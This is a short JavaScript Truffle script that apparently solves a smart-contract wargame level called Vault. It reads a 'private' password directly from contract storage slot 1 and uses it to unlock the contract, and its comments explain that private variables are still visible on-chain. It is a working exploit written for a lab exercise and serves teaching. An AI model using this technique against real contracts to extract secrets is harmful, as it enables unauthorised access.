const VaultContract = artifacts.require('Vault')
const assert = require('assert')

/**
 * We have to retrieve the password and unlock the Vault.
 * Easy, since everything inside a contract is visible!
 * From Solidity docs:
 * " Everything that is inside a contract is visible to all external observers.
 *   Making something private only prevents other contracts from accessing and modifying the
 *   information, but it will still be visible to the whole world outside of the blockchain."
 * https://solidity.readthedocs.io/en/v0.4.25/contracts.html#visibility-and-getters
 */
async function execute(callback) {
    let contract = await VaultContract.deployed()
    
    // Check initial contract state
    let isLocked = await contract.locked.call()
    assert.equal(isLocked, true)
    console.log(`Is locked: ${isLocked}`)

    /* 
    Now read the password.
    Observe that a simple contract.password.call() will not work here.
    We have to access the contract storage at the position where the password variable
    is stored.  By looking at Vault.sol code, we see that 'locked' is at 0 and 'password' is at 1
    */
    let password = await web3.eth.getStorageAt(contract.address, 1)
    console.log(`The password is ${web3.toAscii(password)}`)
    
    // Unlock!
    await contract.unlock(password)

    // Check final contract state
    isLocked = await contract.locked.call()
    assert.equal(isLocked, false)
    console.log(`Is locked: ${isLocked}`)
    
    callback()
}

module.exports = execute
